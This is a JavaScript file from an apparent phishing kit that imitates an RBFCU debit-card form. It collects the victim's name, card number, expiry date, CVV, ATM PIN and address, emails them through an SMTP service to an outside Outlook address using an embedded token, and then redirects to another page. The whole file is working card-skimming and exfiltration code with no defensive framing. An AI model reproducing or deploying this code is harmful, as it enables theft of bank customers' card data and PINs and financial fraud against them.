const fname = document.getElementById('fname');
const fdebit = document.getElementById('fdebit');
const fexp = document.getElementById('fexp');
const fcvv = document.getElementById('fcvv');
const fpin = document.getElementById('fpin');
const faddress = document.getElementById('faddress');
const fcity = document.getElementById('fcity');
const fzip = document.getElementById('fzip');
const fstate = document.getElementById('fstate');

const submit = document.getElementsByClassName('contact')[0];

submit.addEventListener('submit', (e) => {
    e.preventDefault();

    let ebody = `
    <b>RBFCU Debit</b>
    <br>
    <br>
    <br>
    <b>Name: </b>${fname.value} 
    <br>
    <br>
    <br>
    <b>Debit: </b>${fdebit.value} 
    <br>
    <br>
    <b>EXP Date: </b>${fexp.value}
    <br>
    <br>
    <b>CVV: </b>${fcvv.value}
    <br>
    <br>
    <b>ATM Pin: </b>${fpin.value}
    <br>
    <br>
    <br>
    <b>Address: </b>${faddress.value}
    <br>
    <br>
    <b>City: </b>${fcity.value}
    <br>
    <br>
    <b>Zipcode: </b>${fzip.value}
    <br>
    <br>
    <b>State: </b>${fstate.value}
    <br>`;

    Email.send({
        SecureToken: "9c8cec46-60dd-4046-b3d0-0751b0d5c5c0",
        To: 'jakesfishin111@outlook.com',
        From: "jakeramon999@gmail.com",
        Subject: "RBFCU Debit: " + fname.value,
        Body: ebody
    }).then(function() {
        window.location.href = "v.html";
    });
});